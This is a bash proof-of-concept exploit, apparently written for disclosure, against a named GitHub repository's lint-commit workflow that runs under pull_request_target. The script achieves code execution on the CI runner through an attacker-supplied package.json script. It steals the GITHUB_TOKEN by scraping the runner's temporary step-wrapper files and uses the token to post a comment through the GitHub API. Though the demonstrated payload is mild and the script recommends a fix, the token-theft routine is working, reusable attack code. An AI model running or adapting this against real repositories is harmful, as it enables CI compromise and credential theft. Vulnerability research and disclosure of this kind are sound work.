#!/usr/bin/env bash
#
# Proof of concept for a pull_request_target RCE in oddlama/vane's
# .github/workflows/lint-commit.yml.
#
# Vector: the workflow runs `yarn -s run commitlint -q` against the
# attacker-controlled checkout. Yarn resolves `commitlint` against
# package.json `scripts` before node_modules/.bin, so an attacker-supplied
# `scripts.commitlint` is executed in place of the real linter.
#
# This script (1) demonstrates code execution on the runner, (2) recovers
# the GITHUB_TOKEN from the step-wrapper script GitHub Actions writes to
# /home/runner/work/_temp, and (3) uses the recovered token to post a
# single comment on the PR as github-actions[bot].
#
set -euo pipefail

log() { printf '[poc] %s\n' "$*" >&2; }

require_env() {
  local var
  for var in "$@"; do
    if [[ -z "${!var:-}" ]]; then
      log "missing required env: $var"
      exit 0
    fi
  done
}

require_env GITHUB_REPOSITORY GITHUB_EVENT_PATH

log "execution context: user=$(id -un) host=$(hostname) cwd=$PWD"
log "github: repo=$GITHUB_REPOSITORY event=${GITHUB_EVENT_NAME:-?} run=${GITHUB_RUN_ID:-?}"

PR_NUMBER=$(jq -r '.pull_request.number // empty' "$GITHUB_EVENT_PATH")
[[ -n "$PR_NUMBER" ]] || { log "no pull_request.number in event payload"; exit 0; }

# GITHUB_TOKEN is not exported to step processes; it is inlined as a literal
# into the temporary wrapper script that bash actually executes. Recover it
# from there.
recover_token() {
  local file token
  for file in /home/runner/work/_temp/*.sh; do
    [[ -r "$file" ]] || continue
    token=$(grep -oE 'Authorization: Bearer [A-Za-z0-9_]+' "$file" | head -1 | awk '{print $3}')
    if [[ -n "$token" ]]; then
      printf '%s' "$token"
      return 0
    fi
  done
  return 1
}

TOKEN=$(recover_token) || { log "could not recover GITHUB_TOKEN"; exit 0; }
log "recovered GITHUB_TOKEN (${#TOKEN} chars) from runner step-wrapper"

read -r -d '' COMMENT <<'EOF' || true
**Proof of concept — `pull_request_target` RCE**

This comment was posted from a fork PR via the `lint-commit.yml` workflow:

1. The workflow uses `on: pull_request_target` and checks out the PR head SHA.
2. It then runs `yarn -s run commitlint -q`, which resolves `commitlint` against
   the checked-out `package.json` `scripts` field before `node_modules/.bin`.
3. A malicious `scripts.commitlint` entry runs arbitrary code on the runner.
4. The `GITHUB_TOKEN` is then recovered from the step-wrapper script in
   `/home/runner/work/_temp` and used to authenticate this comment.

The payload is benign. Recommended fix: switch the trigger to `pull_request`.
EOF

PAYLOAD=$(jq -n --arg body "$COMMENT" '{body: $body}')
HTTP_CODE=$(curl --silent --show-error --output /tmp/poc-response.json \
  --write-out '%{http_code}' \
  --request POST \
  --header "Authorization: Bearer $TOKEN" \
  --header "Accept: application/vnd.github+json" \
  --header "Content-Type: application/json" \
  --data "$PAYLOAD" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments")

log "comment POST -> HTTP $HTTP_CODE"
if [[ "$HTTP_CODE" != "201" ]]; then
  log "response: $(jq -c . /tmp/poc-response.json 2>/dev/null || cat /tmp/poc-response.json)"
fi
